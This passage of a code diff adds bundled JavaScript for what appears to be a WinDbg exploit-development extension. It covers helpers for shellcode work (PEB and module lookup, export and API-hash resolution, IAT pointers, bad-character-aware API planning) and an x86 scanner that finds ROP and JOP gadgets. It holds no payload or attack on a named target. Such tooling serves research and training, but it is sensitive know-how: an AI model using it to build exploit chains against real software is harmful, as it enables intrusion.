+        return { kind: "not_found", name };
+      }
+      const bestScore = Math.min(...scored.map((entry) => entry.score));
+      const candidates2 = scored.filter((entry) => entry.score === bestScore).map((entry) => entry.module).sort((a, b) => a.base < b.base ? -1 : 1);
+      if (candidates2.length === 1) {
+        return { kind: "ok", module: candidates2[0] };
+      }
+      return { kind: "ambiguous", candidates: candidates2 };
+    }
+    findMainModule() {
+      var _a, _b, _c, _d, _e, _f;
+      const modules = this.readModules();
+      if (modules.length === 0) {
+        return { kind: "not_found", name: "<main-executable>" };
+      }
+      const process = host;
+      const executablePath = ((_d = (_c = (_a = process.currentProcess) == null ? void 0 : _a.ExecutablePath) != null ? _c : (_b = process.currentProcess) == null ? void 0 : _b.Path) != null ? _d : "").toLowerCase();
+      const processName = ((_f = (_e = process.currentProcess) == null ? void 0 : _e.Name) != null ? _f : "").toLowerCase();
+      if (executablePath) {
+        const byPath = modules.find((module) => module.path.toLowerCase() === executablePath);
+        if (byPath) {
+          return { kind: "ok", module: byPath };
+        }
+      }
+      if (processName) {
+        const normalized = processName.endsWith(".exe") ? processName : `${processName}.exe`;
+        const byName = modules.find((module) => module.name.toLowerCase() === normalized);
+        if (byName) {
+          return { kind: "ok", module: byName };
+        }
+      }
+      return { kind: "ok", module: modules[0] };
+    }
+    getPebAddress() {
+      var _a, _b, _c, _d, _e, _f, _g;
+      const hostAny = host;
+      const fromPseudo = tryToBigInt((_e = (_d = (_c = (_b = (_a = hostAny.namespace) == null ? void 0 : _a.Debugger) == null ? void 0 : _b.State) == null ? void 0 : _c.PseudoRegisters) == null ? void 0 : _d.General) == null ? void 0 : _e.peb);
+      if (fromPseudo && fromPseudo !== __bi(0)) {
+        return fromPseudo;
+      }
+      const fromProcess = tryToBigInt((_g = (_f = hostAny.currentProcess) == null ? void 0 : _f.Environment) == null ? void 0 : _g.EnvironmentBlock);
+      if (fromProcess && fromProcess !== __bi(0)) {
+        return fromProcess;
+      }
+      return void 0;
+    }
+    readModules() {
+      var _a;
+      const hostAny = host;
+      const source = (_a = hostAny.currentProcess) == null ? void 0 : _a.Modules;
+      const items = toArray2(source);
+      return items.map((entry) => {
+        var _a2, _b, _c, _d, _e, _f;
+        const moduleAny = entry;
+        const rawName = (_a2 = moduleAny.Name) != null ? _a2 : "<unknown>";
+        const path = (_b = moduleAny.Path) != null ? _b : rawName;
+        const name = moduleBasename(rawName);
+        const base = (_e = tryToBigInt((_d = (_c = moduleAny.BaseAddress) != null ? _c : moduleAny.Base) != null ? _d : moduleAny.Address)) != null ? _e : __bi(0);
+        let end = tryToBigInt(moduleAny.EndAddress);
+        const sizeFromModule = tryToBigInt((_f = moduleAny.Size) != null ? _f : moduleAny.Length);
+        if (!end && sizeFromModule && sizeFromModule > __bi(0)) {
+          end = base + sizeFromModule;
+        }
+        if (!end) {
+          end = base;
+        }
+        const size = end > base ? end - base : __bi(0);
+        return {
+          name,
+          path,
+          base,
+          end,
+          size
+        };
+      }).filter((module) => module.base !== __bi(0)).sort((a, b) => a.base < b.base ? -1 : 1);
+    }
+    collectPageProtections(module) {
+      var _a;
+      const counts = /* @__PURE__ */ new Map();
+      const pageSize = __bi(4096);
+      for (let page = module.base; page < module.end; page += pageSize) {
+        const protect = this.readPageProtection(page);
+        counts.set(protect, ((_a = counts.get(protect)) != null ? _a : 0) + 1);
+      }
+      return counts;
+    }
+    readPageProtection(address) {
+      const output = executeDebuggerCommand(`!vprot ${formatAddress(address, this.pointerSize)}`);
+      const parsed = parseProtectFromVprot(output);
+      if (parsed !== void 0) {
+        return parsed;
+      }
+      throw new Error(`Unable to parse !vprot output for ${formatAddress(address, this.pointerSize)}.`);
+    }
+    isExecutableProtect(protect) {
+      return (protect & 255) === 16 || (protect & 255) === 32 || (protect & 255) === 64 || (protect & 255) === 128;
+    }
+    moduleCandidatesRows(candidates2) {
+      return candidates2.map((module) => ({
+        Base: toDmlAddress(module.base, "db"),
+        End: toDmlAddress(module.end, "db"),
+        Name: module.name,
+        Path: module.path
+      }));
+    }
+    lookupFailureRows(lookup) {
+      if (lookup.kind === "ambiguous") {
+        return this.moduleCandidatesRows(lookup.candidates);
+      }
+      if (lookup.kind === "not_found") {
+        return this.errorRows(`No module matches "${lookup.name}".`);
+      }
+      return this.errorRows(`Unexpected successful module lookup for "${lookup.module.name}".`);
+    }
+    errorRows(message) {
+      return [{ Error: message }];
+    }
+  };
+  function toArray2(value) {
+    if (Array.isArray(value)) {
+      return value;
+    }
+    if (value && typeof value[Symbol.iterator] === "function") {
+      try {
+        return Array.from(value);
+      } catch (_error) {
+        return [];
+      }
+    }
+    return [];
+  }
+  function tryToBigInt(value) {
+    var _a;
+    if (typeof value === "bigint") {
+      return value;
+    }
+    if (typeof value === "number" && Number.isFinite(value)) {
+      return __bi(Math.max(0, Math.trunc(value)));
+    }
+    if (typeof value === "string") {
+      const text = value.trim();
+      if (/^0x[0-9a-f]+$/i.test(text)) {
+        return __bi(text);
+      }
+      if (/^[0-9a-f]+$/i.test(text)) {
+        return __bi(`0x${text}`);
+      }
+      if (/^[0-9]+$/.test(text)) {
+        return __bi(text);
+      }
+      return void 0;
+    }
+    if (!value || typeof value !== "object") {
+      return void 0;
+    }
+    const addressed = value;
+    const fromAddress = tryToBigInt((_a = addressed.address) != null ? _a : addressed.Address);
+    if (fromAddress !== void 0) {
+      return fromAddress;
+    }
+    const valueOf = value.valueOf;
+    if (typeof valueOf === "function") {
+      const unwrapped = valueOf.call(value);
+      if (unwrapped !== value) {
+        const parsed = tryToBigInt(unwrapped);
+        if (parsed !== void 0) {
+          return parsed;
+        }
+      }
+    }
+    const asString = value.toString;
+    if (typeof asString === "function") {
+      return tryToBigInt(asString.call(value));
+    }
+    return void 0;
+  }
+  function readAsciiString2(address, maxLength) {
+    const chars = [];
+    const chunkSize = 64;
+    for (let offset = 0; offset < maxLength; offset += chunkSize) {
+      const length = Math.min(chunkSize, maxLength - offset);
+      const bytes = tryReadMemory(address + __bi(offset), length);
+      if (!bytes || bytes.length === 0) {
+        if (chars.length > 0) {
+          break;
+        }
+        throw new Error(`Unable to read ASCII string at 0x${address.toString(16).toUpperCase()}.`);
+      }
+      for (let i = 0; i < bytes.length; i += 1) {
+        const ch = bytes[i];
+        if (ch === 0) {
+          return chars.join("");
+        }
+        chars.push(String.fromCharCode(ch));
+      }
+    }
+    return chars.join("");
+  }
+  function toDmlAddress(address, command2) {
+    const hex4 = `0x${address.toString(16).toUpperCase()}`;
+    return `<link cmd="${command2} ${hex4}">${hex4}</link>`;
+  }
+  function toDmlModule(name) {
+    var _a;
+    const fileName = (_a = name.replace(/\\/g, "/").split("/").pop()) != null ? _a : "";
+    const moduleName = fileName.replace(/\.[^.]+$/, "");
+    if (!moduleName || !/^[A-Za-z0-9_.$?-]+$/.test(moduleName)) {
+      return name;
+    }
+    return toDmlText(name, `lmv m ${moduleName}`);
+  }
+  function toDmlSymbol(moduleName, symbol) {
+    var _a;
+    if (symbol === "<ordinal>" || !/^[A-Za-z0-9_?$@.]+$/.test(symbol)) {
+      return symbol;
+    }
+    const fileName = (_a = moduleName.replace(/\\/g, "/").split("/").pop()) != null ? _a : "";
+    const moduleToken = fileName.replace(/\.[^.]+$/, "");
+    if (!moduleToken || !/^[A-Za-z0-9_.$?-]+$/.test(moduleToken)) {
+      return symbol;
+    }
+    return toDmlText(symbol, `x ${moduleToken}!${symbol}`);
+  }
+  function toDmlText(label, command2) {
+    const escapedLabel = label.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    return `<link cmd="${command2}">${escapedLabel}</link>`;
+  }
+  function machineToString(machine) {
+    switch (machine) {
+      case 332:
+        return "x86";
+      case 34404:
+        return "x64";
+      default:
+        return "unknown";
+    }
+  }
+  function normalizeNeedle(value) {
+    if (!value) {
+      return "";
+    }
+    return value.trim().toLowerCase();
+  }
+  function formatError(error2) {
+    if (error2 instanceof Error && error2.message) {
+      return error2.message;
+    }
+    return String(error2);
+  }
+  function parseHashValue(value) {
+    if (typeof value === "number") {
+      return Number.isFinite(value) ? value >>> 0 : void 0;
+    }
+    if (typeof value === "bigint") {
+      return Number(__bi.and(value, __bi(4294967295)));
+    }
+    const text = value.trim().toLowerCase();
+    if (!text) {
+      return void 0;
+    }
+    const parsed = text.startsWith("0x") ? parseInt(text, 16) : parseInt(text, 10);
+    if (Number.isNaN(parsed)) {
+      return void 0;
+    }
+    return parsed >>> 0;
+  }
+  function moduleBasename(value) {
+    const normalized = value.trim();
+    if (!normalized) {
+      return "<unknown>";
+    }
+    const parts = normalized.split(/[\\/]+/);
+    return parts[parts.length - 1] || normalized;
+  }
+  function moduleNameMatches(name, requested) {
+    const normalize = (value) => value.trim().toLowerCase().replace(/\.dll$/, "");
+    return normalize(name) === normalize(requested);
+  }
+  function parseApiSpec(value) {
+    const trimmed = value.trim();
+    if (!trimmed)
+      return void 0;
+    const parts = trimmed.split("!");
+    if (parts.length === 1)
+      return { symbol: parts[0].trim() || "" };
+    if (parts.length === 2 && parts[0].trim() && parts[1].trim()) {
+      return { module: parts[0].trim(), symbol: parts[1].trim() };
+    }
+    return void 0;
+  }
+  function createShellcodeNamespace() {
+    const helper = new ShellcodeHelper();
+    const helperHelp = (name) => {
+      const entry = findHelpEntry(name);
+      return renderAndReturn(`Help: ${name}`, entry ? helpRows(entry) : [{ Error: `Unknown helper '${name}'.` }]);
+    };
+    const wantsHelp = (value) => value === "help";
+    const renderAndReturn = (title, rows) => {
+      if (rows.length === 0) {
+        return toDxResult(title, rows);
+      }
+      section(title);
+      if (rows.length > 0 && "Error" in rows[0]) {
+        error(rows[0].Error);
+        return toDxResult(title, rows);
+      }
+      const maxPrintedRows = title === "sc.exports" || title === "sc.hashes" ? 100 : 200;
+      const printedRows = rows.length > maxPrintedRows ? rows.slice(0, maxPrintedRows) : rows;
+      const keys = title === "sc.modules" ? ["Base", "End", "Size", "Name"] : [...new Set(printedRows.flatMap((row) => Object.keys(row)))];
+      table(keys.map((key2) => ({ key: key2, header: key2 })), printedRows);
+      if (printedRows.length < rows.length) {
+        info(`Showing first ${printedRows.length} of ${rows.length} rows. Use a filter argument to narrow output; full rows remain available under .rows.`);
+      }
+      return toDxResult(title, rows);
+    };
+    return {
+      peb: (help) => wantsHelp(help) ? helperHelp("sc.peb") : renderAndReturn("sc.peb", helper.peb()),
+      modules: (help) => wantsHelp(help) ? helperHelp("sc.modules") : renderAndReturn("sc.modules", helper.modules()),
+      module_pages: (name) => wantsHelp(name) ? helperHelp("sc.module_pages") : renderAndReturn("sc.module_pages", helper.modulePages(name)),
+      page_summary: (name) => wantsHelp(name) ? helperHelp("sc.page_summary") : renderAndReturn("sc.page_summary", helper.pageSummary(name)),
+      base: (name) => wantsHelp(name) ? helperHelp("sc.base") : renderAndReturn("sc.base", helper.base(name)),
+      pe: (name) => wantsHelp(name) ? helperHelp("sc.pe") : renderAndReturn("sc.pe", helper.pe(name)),
+      exports: (name, filter) => wantsHelp(name) ? helperHelp("sc.exports") : renderAndReturn("sc.exports", helper.exports(name, filter)),
+      resolve: (module, symbol) => wantsHelp(module) ? helperHelp("sc.resolve") : renderAndReturn("sc.resolve", helper.resolve(module, symbol)),
+      hashes: (module, algorithm) => wantsHelp(module) ? helperHelp("sc.hashes") : renderAndReturn("sc.hashes", helper.hashes(module, algorithm)),
+      hash: (name, algorithm) => wantsHelp(name) ? helperHelp("sc.hash") : renderAndReturn("sc.hash", helper.hash(name, algorithm)),
+      hashresolve: (module, hashValue, algorithm) => wantsHelp(module) ? helperHelp("sc.hashresolve") : renderAndReturn("sc.hashresolve", helper.hashresolve(module, hashValue, algorithm)),
+      algorithms: (help) => wantsHelp(help) ? helperHelp("sc.algorithms") : renderAndReturn("sc.algorithms", helper.algorithms()),
+      exportdir: (module) => wantsHelp(module) ? helperHelp("sc.exportdir") : renderAndReturn("sc.exportdir", helper.exportdir(module)),
+      export: (module, symbol) => wantsHelp(module) ? helperHelp("sc.export") : renderAndReturn("sc.export", helper.export(module, symbol)),
+      exportat: (module, ordinalIndex) => wantsHelp(module) ? helperHelp("sc.exportat") : renderAndReturn("sc.exportat", helper.exportat(module, ordinalIndex)),
+      exportwalk: (module, symbol, verbose) => wantsHelp(module) ? helperHelp("sc.exportwalk") : renderAndReturn("sc.exportwalk", helper.exportwalk(module, symbol, verbose)),
+      iat: (module, filter) => wantsHelp(module) ? helperHelp("sc.iat") : renderAndReturn("sc.iat", helper.iat(module, filter)),
+      iat_find: (symbol) => wantsHelp(symbol) ? helperHelp("sc.iat_find") : renderAndReturn("sc.iat_find", helper.iat_find(symbol)),
+      iat_ptr: (module, symbol) => wantsHelp(module) ? helperHelp("sc.iat_ptr") : renderAndReturn("sc.iat_ptr", helper.iat_ptr(module, symbol)),
+      api_plan: (target, badchars = []) => helper.apiPlan(target, badchars)
+    };
+  }
+
+  // src/core/backward_scanner.ts
+  var REG_NAMES = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"];
+  var ALU_REG_OPCODES = [
+    { opcode: 1, name: "add", form: "rm" },
+    { opcode: 3, name: "add", form: "reg" },
+    { opcode: 9, name: "or", form: "rm" },
+    { opcode: 11, name: "or", form: "reg" },
+    { opcode: 17, name: "adc", form: "rm" },
+    { opcode: 19, name: "adc", form: "reg" },
+    { opcode: 25, name: "sbb", form: "rm" },
+    { opcode: 27, name: "sbb", form: "reg" },
+    { opcode: 33, name: "and", form: "rm" },
+    { opcode: 35, name: "and", form: "reg" },
+    { opcode: 41, name: "sub", form: "rm" },
+    { opcode: 43, name: "sub", form: "reg" },
+    { opcode: 49, name: "xor", form: "rm" },
+    { opcode: 51, name: "xor", form: "reg" },
+    { opcode: 57, name: "cmp", form: "rm" },
+    { opcode: 59, name: "cmp", form: "reg" },
+    { opcode: 133, name: "test", form: "rm" },
+    { opcode: 135, name: "xchg", form: "rm" },
+    { opcode: 137, name: "mov", form: "rm" },
+    { opcode: 139, name: "mov", form: "reg" }
+  ];
+  var ALU_EAX_IMM32 = [
+    { opcode: 5, name: "add" },
+    { opcode: 13, name: "or" },
+    { opcode: 21, name: "adc" },
+    { opcode: 29, name: "sbb" },
+    { opcode: 37, name: "and" },
+    { opcode: 45, name: "sub" },
+    { opcode: 53, name: "xor" }
+  ];
+  var GRP1_NAMES = ["add", "or", "adc", "sbb", "and", "sub", "xor", "cmp"];
+  var FPU_D9_MNEMONICS = {
+    224: "fchs",
+    225: "fabs",
+    228: "ftst",
+    229: "fxam",
+    232: "fld1",
+    233: "fldl2t",
+    234: "fldl2e",
+    235: "fldpi",
+    236: "fldlg2",
+    237: "fldln2",
+    238: "fldz",
+    240: "f2xm1",
+    241: "fyl2x",
+    242: "fptan",
+    243: "fpatan",
+    244: "fxtract",
+    245: "fprem1",
+    246: "fdecstp",
+    247: "fincstp",
+    248: "fprem",
+    249: "fyl2xp1",
+    250: "fsqrt",
+    251: "fsincos",
+    252: "frndint",
+    253: "fscale",
+    254: "fsin",
+    255: "fcos"
+  };
+  function formatHex(value) {
+    return `0x${(value >>> 0).toString(16)}`;
+  }
+  function signedByte(value) {
+    return value > 127 ? value - 256 : value;
+  }
+  function signedDword(bytes, offset) {
+    if (offset + 3 >= bytes.length)
+      return void 0;
+    return bytes[offset] | bytes[offset + 1] << 8 | bytes[offset + 2] << 16 | bytes[offset + 3] << 24 | 0;
+  }
+  function formatDisplacement(value) {
+    if (value === 0)
+      return "";
+    return value < 0 ? `-0x${(-value).toString(16)}` : `+0x${value.toString(16)}`;
+  }
+  function decodeModRM(bytes, offset) {
+    if (offset >= bytes.length)
+      return void 0;
+    const modrm = bytes[offset];
+    const mod = modrm >> 6;
+    const reg = modrm >> 3 & 7;
+    const rm = modrm & 7;
+    if (mod === 3)
+      return { reg, rm, length: 1 };
+    let cursor = offset + 1;
+    let base;
+    let index;
+    let scale = 1;
+    let displacement = 0;
+    let hasDisplacement = false;
+    if (rm === 4) {
+      if (cursor >= bytes.length)
+        return void 0;
+      const sib = bytes[cursor++];
+      scale = 1 << (sib >> 6);
+      const indexId = sib >> 3 & 7;
+      const baseId = sib & 7;
+      if (indexId !== 4)
+        index = REG_NAMES[indexId];
+      if (!(mod === 0 && baseId === 5))
+        base = REG_NAMES[baseId];
+      if (mod === 0 && baseId === 5) {
+        const value = signedDword(bytes, cursor);
+        if (value === void 0)
+          return void 0;
+        displacement = value;
+        hasDisplacement = true;
+        cursor += 4;
+      }
+    } else if (mod === 0 && rm === 5) {
+      const value = signedDword(bytes, cursor);
+      if (value === void 0)
+        return void 0;
+      displacement = value;
+      hasDisplacement = true;
+      cursor += 4;
+    } else {
+      base = REG_NAMES[rm];
+    }
+    if (mod === 1) {
+      if (cursor >= bytes.length)
+        return void 0;
+      displacement = signedByte(bytes[cursor++]);
+      hasDisplacement = true;
+    } else if (mod === 2) {
+      const value = signedDword(bytes, cursor);
+      if (value === void 0)
+        return void 0;
+      displacement = value;
+      hasDisplacement = true;
+      cursor += 4;
+    }
+    const terms = [];
+    if (base)
+      terms.push(base);
+    if (index)
+      terms.push(scale === 1 ? index : `${index}*${scale}`);
+    let expression = terms.join("+");
+    if (hasDisplacement || !expression) {
+      if (!expression)
+        expression = formatHex(displacement);
+      else
+        expression += formatDisplacement(displacement);
+    }
+    return { reg, memory: `dword [${expression}]`, length: cursor - offset };
+  }
+  function tryDecodeInsn(bytes, offset) {
+    if (offset >= bytes.length)
+      return void 0;
+    const b0 = bytes[offset];
+    if (b0 >= 64 && b0 <= 71)
+      return { length: 1, mnemonic: `inc ${REG_NAMES[b0 - 64]}` };
+    if (b0 >= 72 && b0 <= 79)
+      return { length: 1, mnemonic: `dec ${REG_NAMES[b0 - 72]}` };
+    if (b0 >= 80 && b0 <= 87)
+      return { length: 1, mnemonic: `push ${REG_NAMES[b0 - 80]}` };
+    if (b0 >= 88 && b0 <= 95)
+      return { length: 1, mnemonic: `pop ${REG_NAMES[b0 - 88]}` };
+    if (b0 === 96)
+      return { length: 1, mnemonic: "pushad" };
+    if (b0 === 97)
+      return { length: 1, mnemonic: "popad" };
+    if (b0 === 144)
+      return { length: 1, mnemonic: "nop" };
+    if (b0 >= 145 && b0 <= 151)
+      return { length: 1, mnemonic: `xchg eax, ${REG_NAMES[b0 - 144]}` };
+    if (b0 === 201)
+      return { length: 1, mnemonic: "leave" };
+    if (b0 === 248)
+      return { length: 1, mnemonic: "clc" };
+    if (b0 === 249)
+      return { length: 1, mnemonic: "stc" };
+    if (b0 === 104) {
+      const immediate = signedDword(bytes, offset + 1);
+      if (immediate === void 0)
+        return void 0;
+      return { length: 5, mnemonic: `push ${formatHex(immediate)}` };
+    }
+    if (b0 === 106) {
+      if (offset + 1 >= bytes.length)
+        return void 0;
+      return { length: 2, mnemonic: `push ${formatHex(signedByte(bytes[offset + 1]))}` };
+    }
+    if (b0 >= 184 && b0 <= 191) {
+      const immediate = signedDword(bytes, offset + 1);
+      if (immediate === void 0)
+        return void 0;
+      return { length: 5, mnemonic: `mov ${REG_NAMES[b0 - 184]}, ${formatHex(immediate)}` };
+    }
+    if (offset + 1 >= bytes.length)
+      return void 0;
+    const b1 = bytes[offset + 1];
+    for (const entry of ALU_REG_OPCODES) {
+      if (b0 === entry.opcode) {
+        const decoded = decodeModRM(bytes, offset + 1);
+        if (!decoded)
+          return void 0;
+        if (decoded.rm !== void 0) {
+          const dst2 = entry.form === "rm" ? REG_NAMES[decoded.rm] : REG_NAMES[decoded.reg];
+          const src2 = entry.form === "rm" ? REG_NAMES[decoded.reg] : REG_NAMES[decoded.rm];
+          return { length: 1 + decoded.length, mnemonic: `${entry.name} ${dst2}, ${src2}` };
+        }
+        if (entry.name !== "xchg" && entry.name !== "mov")
+          return void 0;
+        if (!decoded.memory)
+          return void 0;
+        const dst = entry.form === "rm" ? decoded.memory : REG_NAMES[decoded.reg];
+        const src = entry.form === "rm" ? REG_NAMES[decoded.reg] : decoded.memory;
+        return { length: 1 + decoded.length, mnemonic: `${entry.name} ${dst}, ${src}` };
+      }
+    }
+    if (b0 === 141) {
+      const decoded = decodeModRM(bytes, offset + 1);
+      if (!(decoded == null ? void 0 : decoded.memory))
+        return void 0;
+      return { length: 1 + decoded.length, mnemonic: `lea ${REG_NAMES[decoded.reg]}, ${decoded.memory}` };
+    }
+    if (b0 === 247) {
+      const decoded = decodeModRM(bytes, offset + 1);
+      if (!decoded || decoded.rm === void 0)
+        return void 0;
+      const op4 = b1 >> 3 & 7;
+      if (op4 === 2)
+        return { length: 2, mnemonic: `not ${REG_NAMES[decoded.rm]}` };
+      if (op4 === 3)
+        return { length: 2, mnemonic: `neg ${REG_NAMES[decoded.rm]}` };
+      return void 0;
+    }
+    if (b0 === 255) {
+      const decoded = decodeModRM(bytes, offset + 1);
+      if (!decoded)
+        return void 0;
+      const op4 = b1 >> 3 & 7;
+      const operand = decoded.rm !== void 0 ? REG_NAMES[decoded.rm] : decoded.memory;
+      if (!operand)
+        return void 0;
+      if (op4 === 2)
+        return { length: 1 + decoded.length, mnemonic: `call ${operand}` };
+      if (op4 === 4)
+        return { length: 1 + decoded.length, mnemonic: `jmp ${operand}` };
+      return void 0;
+    }
+    if (b0 === 217) {
+      const name = FPU_D9_MNEMONICS[b1];
+      if (name)
+        return { length: 2, mnemonic: name };
+      return void 0;
+    }
+    if (b0 === 131) {
+      if (offset + 2 >= bytes.length)
+        return void 0;
+      const decoded = decodeModRM(bytes, offset + 1);
+      if (!decoded || decoded.rm === void 0)
+        return void 0;
+      const op4 = b1 >> 3 & 7;
+      const imm8 = bytes[offset + 2];
+      const signed = imm8 > 127 ? imm8 - 256 : imm8;
+      const name = GRP1_NAMES[op4];
+      return { length: 3, mnemonic: `${name} ${REG_NAMES[decoded.rm]}, ${formatHex(signed < 0 ? signed >>> 0 : imm8)}` };
+    }
+    if (b0 === 129) {
+      const decoded = decodeModRM(bytes, offset + 1);
+      if (!decoded || decoded.rm === void 0)
+        return void 0;
+      const immediateOffset = offset + 1 + decoded.length;
+      const imm = signedDword(bytes, immediateOffset);
+      if (imm === void 0)
+        return void 0;
+      const op4 = b1 >> 3 & 7;
+      return { length: 1 + decoded.length + 4, mnemonic: `${GRP1_NAMES[op4]} ${REG_NAMES[decoded.rm]}, ${formatHex(imm)}` };
+    }
+    for (const entry of ALU_EAX_IMM32) {
+      if (b0 === entry.opcode) {
+        if (offset + 4 >= bytes.length)
+          return void 0;
+        const imm = bytes[offset + 1] | bytes[offset + 2] << 8 | bytes[offset + 3] << 16 | bytes[offset + 4] << 24 >>> 0;
+        return { length: 5, mnemonic: `${entry.name} eax, ${formatHex(imm >>> 0)}` };
+      }
+    }
+    return void 0;
+  }
+  function tryDecodeSequence(bytes, startOffset, targetOffset, maxInsns) {
+    const insns = [];
+    let pos = startOffset;
+    while (pos < targetOffset && insns.length < maxInsns) {
+      const decoded = tryDecodeInsn(bytes, pos);
+      if (!decoded)
+        return void 0;
+      pos += decoded.length;
+      insns.push(decoded);
+    }
+    return pos === targetOffset ? insns : void 0;
+  }
+  var PATTERN_SCANNER_PREFIXES = /* @__PURE__ */ new Set(["pop ", "push ", "pushad", "popad", "nop", "xchg eax, "]);
+  function isPatternScannerGadget(mnemonic) {
+    for (const prefix of PATTERN_SCANNER_PREFIXES) {
+      if (mnemonic.startsWith(prefix) || mnemonic === prefix.trimEnd())
+        return true;
+    }
+    return false;
+  }
+  function hasUsefulEffect(insns) {
+    if (insns.every((insn) => insn.mnemonic === "nop"))
+      return false;
+    if (insns.length === 1 && isPatternScannerGadget(insns[0].mnemonic))
+      return false;
+    return true;
+  }
+  function dispatchKind(mnemonic) {
+    if (mnemonic.startsWith("jmp "))
+      return "JMP_DISPATCH";
+    if (mnemonic.startsWith("call "))
+      return "CALL_DISPATCH";
+    return void 0;
+  }
+  function isSequentialRetChain(mnemonics) {
+    return !mnemonics.some((mnemonic) => dispatchKind(mnemonic) !== void 0);
+  }
+  function scanBackward(options) {
+    var _a, _b, _c;
+    if (getPointerSize() !== 4) {
+      return { gadgets: [], warnings: ["Backward scanning is x86-only."], stats: {} };
+    }
+    const maxResults = (_a = options.maxResults) != null ? _a : 500;
+    const maxInsns = (_b = options.maxInstructionsPerGadget) != null ? _b : 3;
+    const maxBack = (_c = options.maxBackwardBytes) != null ? _c : 12;
+    const scanOpts = {
+      module: options.module,
+      executableOnly: true,
+      maxResults: 200,
+      chunkSize: 16384
+    };
+    const scope = forEachSection(scanOpts);
+    const warnings = scope.warnings.map((w) => w);
+    const seen = /* @__PURE__ */ new Set();
+    const gadgets = [];
+    let terminatorsFound = 0;
+    let dispatchFound = 0;
+    let nonSequentialRejected = 0;
+    for (const section2 of scope.sections) {
+      const readAhead = maxBack + 6;
+      for (let offset = 0; offset < section2.size; offset += 16384) {
+        const chunkStart = section2.start + __bi(offset);
+        const remaining = section2.size - offset;
+        const size = Math.min(remaining, 16384 + readAhead);
+        const bytes = tryReadMemory(chunkStart, size);
+        if (!bytes)
+          continue;
+        const scanLimit = Math.min(bytes.length, remaining < 16384 ? remaining : 16384);
+        for (let i = 0; i < scanLimit; i++) {
+          const standalone = tryDecodeInsn(bytes, i);
+          const standaloneKind = standalone ? dispatchKind(standalone.mnemonic) : void 0;
+          if (standaloneKind) {
+            const addr = chunkStart + __bi(i);
+            const key2 = addr.toString();
+            if (!seen.has(key2)) {
+              seen.add(key2);
+              gadgets.push({ address: addr, mnemonic: standalone.mnemonic, retImm: 0, kind: standaloneKind });
+              dispatchFound++;
+              if (gadgets.length >= maxResults) {
+                return {
+                  gadgets,
+                  warnings,
+                  stats: { terminatorsFound, dispatchFound, nonSequentialRejected, gadgetsDiscovered: gadgets.length, candidateLimit: maxResults, stoppedEarly: 1 }
+                };
+              }
+            }
+          }
+          let retMnemonic;
+          let retImm = 0;
+          if (bytes[i] === 195) {
+            retMnemonic = "ret";
+          } else if (bytes[i] === 194 && i + 2 < bytes.length) {
+            retImm = bytes[i + 1] | bytes[i + 2] << 8;
+            if (retImm === 0 || retImm > 4096)
+              continue;
+            retMnemonic = `ret ${formatHex(retImm)}`;
+          } else {
+            continue;
+          }
+          terminatorsFound++;
+          const termStart = i;
+          const lookBack = Math.min(termStart, maxBack);
+          for (let back = 1; back <= lookBack; back++) {
+            const candidateStart = termStart - back;
+            const insns = tryDecodeSequence(bytes, candidateStart, termStart, maxInsns);
+            if (!insns || insns.length === 0)
+              continue;
+            if (!hasUsefulEffect(insns))
+              continue;
+            if (!isSequentialRetChain(insns.map((insn) => insn.mnemonic))) {
+              nonSequentialRejected++;
+              continue;
+            }
+            const addr = chunkStart + __bi(candidateStart);
+            const key2 = addr.toString();
+            if (seen.has(key2))
+              continue;
+            seen.add(key2);
+            const parts = insns.map((insn) => insn.mnemonic);
+            parts.push(retMnemonic);
+            gadgets.push({ address: addr, mnemonic: parts.join(" ; "), retImm, kind: "RET_CHAIN" });
+            if (gadgets.length >= maxResults) {
+              return {
+                gadgets,
+                warnings,
+                stats: { terminatorsFound, dispatchFound, nonSequentialRejected, gadgetsDiscovered: gadgets.length, candidateLimit: maxResults, stoppedEarly: 1 }
+              };
+            }
+          }
+        }
+      }
+    }
+    return {
+      gadgets,
+      warnings,
+      stats: { terminatorsFound, dispatchFound, nonSequentialRejected, gadgetsDiscovered: gadgets.length, candidateLimit: maxResults, stoppedEarly: 0 }
+    };
+  }
+
+  // src/analysis/live_gadgets.ts
+  function discoverLiveGadgets(options = {}) {
+    var _a, _b, _c, _d, _e, _f, _g, _h, _i, _j, _k, _l;
+    const pointerSize = getPointerSize();
+    const patterns = knownPatternsForPointerSize(pointerSize);
+    const filter = badcharAddressFilter((_a = options.badchars) != null ? _a : [], pointerSize);
+    const maxPerPattern = (_b = options.maxPerPattern) != null ? _b : 40;
+    const scanDepth = Math.min(Math.max(maxPerPattern * 20, 1500), 4e3);
+    const hits = [];
+    const warningSet = /* @__PURE__ */ new Set();
+    let scanned = 0;
+    let rejected = 0;
+    for (const pattern of patterns) {
+      const scan = scanPattern({
+        module: options.module,
+        executableOnly: true,
+        maxResults: scanDepth,
+        chunkSize: 16384
+      }, Uint8Array.from(pattern.bytes));
+      scanned += scan.hits.length;
+      for (const warning of scan.warnings) {
+        warningSet.add(`${warning.region}: ${warning.message}`);
+      }
+      const outcome = applyFilters(scan.hits, [filter]);
+      rejected += outcome.rejected.length;
+      for (const address of outcome.kept.slice(0, maxPerPattern)) {
+        hits.push({ mnemonic: pattern.mnemonic, address, module: (_c = findModuleByAddress(address)) == null ? void 0 : _c.name });
+      }
+    }
+    const seenAddresses = new Set(hits.map((h) => h.address.toString()));
+    const backward = scanBackward({
+      module: options.module,
+      maxResults: Math.min(Math.max(Math.floor((_d = options.maxBackwardGadgets) != null ? _d : 1e4), 1), 1e5),
+      maxInstructionsPerGadget: Math.min(Math.max(Math.floor((_e = options.maxInstructionsPerGadget) != null ? _e : 6), 1), 12),
+      maxBackwardBytes: 12
+    });
+    for (const w of backward.warnings)
+      warningSet.add(w);
+    let backwardAdded = 0;
+    for (const gadget of backward.gadgets) {
+      const key2 = gadget.address.toString();
+      if (seenAddresses.has(key2))
+        continue;
+      seenAddresses.add(key2);
+      const outcome = applyFilters([gadget.address], [filter]);
+      if (outcome.kept.length === 0) {
+        rejected++;
+        continue;
+      }
+      hits.push({ mnemonic: gadget.mnemonic, address: gadget.address, module: (_f = findModuleByAddress(gadget.address)) == null ? void 0 : _f.name });
+      backwardAdded++;
+    }
+    return {
+      hits,
+      warnings: [...warningSet],
+      stats: {
+        patterns: patterns.length,
+        scanned,
+        rejected,
+        discovered: hits.length,
+        backwardTerminators: (_g = backward.stats.terminatorsFound) != null ? _g : 0,
+        backwardDispatch: (_h = backward.stats.dispatchFound) != null ? _h : 0,
